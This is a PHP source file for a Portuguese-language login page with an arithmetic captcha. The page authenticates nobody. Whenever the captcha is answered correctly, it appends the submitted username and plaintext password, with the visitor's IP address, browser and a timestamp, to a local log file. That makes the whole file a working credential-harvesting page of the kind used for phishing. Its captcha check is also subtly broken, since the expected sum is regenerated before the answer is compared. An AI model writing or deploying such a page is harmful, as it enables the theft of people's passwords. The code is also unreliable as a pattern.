<?php
session_start();

$logFolder = "logs";

if (!is_dir($logFolder)) {
    mkdir($logFolder, 0755, true);
}

function getIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    return $_SERVER['REMOTE_ADDR'];
}

function getBrowser() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    if (strpos($ua, 'Firefox') !== false) return 'Firefox';
    if (strpos($ua, 'Chrome') !== false) return 'Chrome';
    if (strpos($ua, 'Safari') !== false) return 'Safari';
    if (strpos($ua, 'MSIE') !== false || strpos($ua, 'Trident') !== false) return 'Internet Explorer';
    return 'Unknown';
}

$captcha1 = rand(1, 9);
$captcha2 = rand(1, 9);
$_SESSION['captcha_result'] = $captcha1 + $captcha2;

$msg = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $answer = intval($_POST['captcha_answer'] ?? 0);
    if ($answer === $_SESSION['captcha_result']) {
        $username = htmlspecialchars($_POST['username'] ?? '');
        $password = htmlspecialchars($_POST['password'] ?? '');
        $ip = getIP();
        $browser = getBrowser();
        $timestamp = date('Y-m-d H:i:s');

        $log = "[$timestamp] Username: $username | Password: $password | IP: $ip | Browser: $browser\n";
        file_put_contents("$logFolder/log.txt", $log, FILE_APPEND);

        $msg = "Login attempt recorded.";
    } else {
        $msg = "Captcha errado. Tente novamente.";
    }

    // Refresh captcha
    $captcha1 = rand(1, 9);
    $captcha2 = rand(1, 9);
    $_SESSION['captcha_result'] = $captcha1 + $captcha2;
}

?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8" />
<title>Área de Login</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f0f0f0;
        display: flex;
        height: 100vh;
        justify-content: center;
        align-items: center;
        margin: 0;
    }
    form {
        background: #fff;
        padding: 20px 30px;
        border-radius: 8px;
        box-shadow: 0 0 8px rgba(0,0,0,0.1);
        width: 300px;
    }
    h2 {
        margin-top: 0;
        margin-bottom: 20px;
        font-weight: normal;
        color: #333;
        text-align: center;
    }
    input[type="text"],
    input[type="password"],
    input[type="number"] {
        width: 100%;
        padding: 10px;
        margin-bottom: 15px;
        border-radius: 4px;
        border: 1px solid #ccc;
        box-sizing: border-box;
    }
    button {
        width: 100%;
        padding: 10px;
        background: #2c7be5;
        border: none;
        border-radius: 4px;
        color: white;
        font-size: 16px;
        cursor: pointer;
    }
    button:hover {
        background: #1a5edb;
    }
    .captcha-container {
        display: flex;
        align-items: center;
        margin-bottom: 15px;
        font-weight: bold;
    }
    .captcha-container span {
        margin-right: 10px;
        font-size: 18px;
    }
    .message {
        color: red;
        text-align: center;
        margin-bottom: 10px;
    }
</style>
</head>
<body>

<form method="POST">
    <h2>Login</h2>
    <?php if ($msg): ?>
        <div class="message"><?php echo $msg; ?></div>
    <?php endif; ?>
    <input type="text" name="username" placeholder="Usuário" required autofocus />
    <input type="password" name="password" placeholder="Senha" required />
    <div class="captcha-container">
        <span><?php echo "$captcha1 + $captcha2"; ?></span>
        <input type="number" name="captcha_answer" placeholder="Resposta" required />
    </div>
    <button type="submit">Entrar</button>
</form>

</body>
</html>
